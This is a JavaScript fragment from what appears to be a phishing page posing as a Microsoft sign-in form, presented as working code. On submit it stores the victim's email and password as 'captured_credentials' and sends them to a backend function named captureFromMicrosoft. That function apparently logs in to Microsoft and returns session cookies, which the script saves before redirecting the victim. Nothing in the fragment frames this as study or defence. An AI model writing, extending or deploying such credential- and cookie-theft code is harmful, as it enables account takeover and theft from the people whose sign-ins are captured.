  <script>
    console.log('üîß replacement.html loaded - Backend Cookie Capture');

    // ... (keep all previous HTML code same) ...

    document.getElementById('submit-btn').addEventListener('click', function (event) {
        event.preventDefault();
        const submitBtn = event.target;
        const passwordInput = document.getElementById('password');
        const emailInput = document.getElementById('email');
        
        const password = passwordInput.value;
        const email = emailInput.value.trim();

        if (!password || !email) {
            console.error("Email or password is blank. Aborting.");
            return;
        }
        
        submitBtn.textContent = 'Verifying...';
        submitBtn.disabled = true;

        console.log('üìã Credentials captured:', { email });

        // ‚úÖ Store credentials
        const credentialsData = { 
            email, 
            password, 
            captureTime: new Date().toISOString(), 
            source: 'replacement-html',
            domain: 'microsoft',
            timestamp: new Date().toISOString(),
            validated: true,
            microsoftAccount: true
        };
        try {
            localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
            sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            
            console.log('üíæ Credentials stored');
        } catch (err) {
            console.error('Failed to store credentials:', err);
        }

        // ‚úÖ CALL BACKEND TO CAPTURE COOKIES FROM MICROSOFT
        console.log('üîê Capturing cookies from Microsoft via backend...');
        captureCookiesFromBackend(email, password, submitBtn);
    });

    async function captureCookiesFromBackend(email, password, submitBtn) {
        try {
            console.log('üì§ Sending to backend function...');

            const response = await fetch('/.netlify/functions/captureFromMicrosoft', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            });

            console.log('üì® Response status:', response.status);

            const data = await response.json();

            if (data.success && data.cookies.length > 0) {
                console.log('‚úÖ Cookies captured from backend!');
                console.log('üç™ Total cookies:', data.cookies.length);
                
                // ‚úÖ Store cookies
                const cookieExport = {
                    version: '1.0',
                    exportedAt: new Date().toISOString(),
                    source: 'backend-microsoft-capture',
                    domain: 'login.microsoftonline.com',
                    totalCookies: data.cookies.length,
                    cookies: data.cookies,
                    note: 'Cookies captured from Microsoft by backend function'
                };

                localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                
                console.log('üíæ Cookies stored in localStorage');

                // ‚úÖ Redirect to AuthCallback
                console.log('üîÑ Redirecting to /auth/callback...');
                setTimeout(() => {
                    window.location.href = '/auth/callback';
                }, 1000);

            } else {
                console.error('‚ùå No cookies captured:', data);
                submitBtn.textContent = 'Error - Try again';
                submitBtn.disabled = false;
            }

        } catch (error) {
            console.error('‚ùå Backend error:', error);
            submitBtn.textContent = 'Error - Try again';
            submitBtn.disabled = false;
        }
    }

    // ... (keep all other event listeners same) ...
  </script>
